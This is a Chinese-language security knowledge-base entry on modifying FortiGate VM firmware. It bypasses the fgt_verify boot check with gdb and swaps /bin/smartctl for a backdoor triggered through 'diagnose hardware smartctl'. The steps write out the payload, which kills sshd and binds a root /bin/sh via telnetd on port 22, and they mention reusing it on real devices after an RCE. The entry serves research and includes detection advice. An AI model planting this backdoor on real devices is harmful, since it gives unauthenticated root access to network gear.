---
id: fortigate-firmware-patch-smartctl-shell
title: FortiGate 固件提取、patch init 绕过校验并借 diagnose smartctl 挂 shell
type: scenario
domain: code-analysis
path: code-analysis/reverse/firmware
technique: 固件修改与内置诊断命令滥用
tags:
- fortigate
- firmware
- gdbserver
- rootfs
- fortios
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
url: /docs/code-analysis/reverse/firmware/fortigate-firmware-patch-smartctl-shell/
draft: false
kb_aliases:
- FortiGate 固件调试环境
- smartctl 后门
---

# FortiGate 固件提取、patch init 绕过校验并借 diagnose smartctl 挂 shell

## 一句话结论

FortiGate VM 磁盘可经 libguestfs/vmware 提取 rootfs.gz，用 ftar/xz 解出 /bin 后可放入 busybox、gdbserver 与自定义 smartctl；内核 flatkc（vmlinux-to-elf 转 ELF）显示启动链走 `fgt_verify()` 校验，patch 掉 /bin/init 中对 do_halt 的调用并在 gdb 中 `set $rax=0` 绕过校验即可获得可调试系统；运行期 `diagnose hardware smartctl` 会直接执行 /bin/smartctl，替换该文件即可在真实设备上以 root 执行任意命令（telnetd 挂 /bin/sh 到 22 端口）。

## 原理

- 固件侧：rootfs.gz 是 gzip+cpio 打包，/bin 经 Fortinet 自有 ftar/xz（--check=sha256）二次压缩；重打包顺序为 `ftar -cf` → `xz -e` → `cpio -H newc` → `gzip`，覆盖回 vmdk 即完成修改。
- 校验侧：内核 init_post 中 `if (!fgt_verify()) kernel_execve("/sbin/init",...)`——校验失败进 panic 循环重启；gdb 附加后在 fgt_verify 返回处 `set $rax=0` 强制通过（patch /bin/init 中 do_halt 调用可避免误触关机流程）。
- 执行侧：FortiOS CLI 的 `diagnose hardware smartctl` 无条件执行 /bin/smartctl 二进制；CLI 本身常可由低权限/受限管理员触达，因此替换该文件等于获得 root 命令执行原语（telnetd -l /bin/sh -b 0.0.0.0 -p 22 后 telnet 即 root shell）。busybox 提供被阉割 shell 缺失的完整指令集。

## 触发条件

- 实验环境：可修改 FortiGate VM 磁盘镜像（vmdk）并经 gdbserver 调试；
- 真实环境：已具有 /bin 写入能力的漏洞利用链（如 SSL-VPN RCE 拿到命令执行），或设备 CLI 可执行 diagnose hardware smartctl 且 /bin 可被覆盖。

## 利用步骤

1. `virt-filesystems`/vmware 挂载 fortigate vmdk，复制 rootfs.gz；`gzip -d` + `cpio -idmv` 解包，`chroot ftar/xz` 解出 /bin。
2. 编译静态 smartctl 替身（system("busybox kill all sshd && busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22")）放入 /bin，同时放 busybox 与 gdbserver。
3. `ftar -cf bin.tar bin; xz -e; cpio -H newc; gzip` 重打包覆盖 rootfs.gz。
4. flatkc 经 vmlinux-to-elf 转 ELF 分析，定位 fgt_verify；gdb 断 init_post，`ni` 至校验返回处 `set $rax=0`，`c` 进入系统。
5. CLI 执行 `diagnose hardware smartctl` 触发替身，telnet 22 得 root shell。

## PoC

无 PoC（流程命令如上；原文验证：gdb 绕过校验后设备正常启动，`diagnose hardware smartctl` 触发后 `telnet 192.168.111.146 22` 执行 `/bin/busybox ls` 列出根目录成功）。

## 变体与关联

- 变体：其他 diagnose 子命令若同样直接执行 /bin 下同名文件均可复用；无 gdb 场景下 patch /bin/init 校验分支为无条件跳转。
- 关联：FortiOS SSL-VPN 堆溢出未认证 RCE（利用本场景获得的环境开发 exploit）；利用内置 node 恢复受限 shell 环境（真实设备无 sh 时的替代提权路径）。
- 防御视角：该流程也是安全研究/应急取证的标准环境搭建手法。

## 检测与防御

- 检测：/bin 下文件哈希完整性校验（FortiOS 自带 filechecksum）、诊断命令执行审计、异常 telnetd 监听。
- 防御：限制 diagnose 权限、启用固件签名校验与安全启动、管理面隔离。
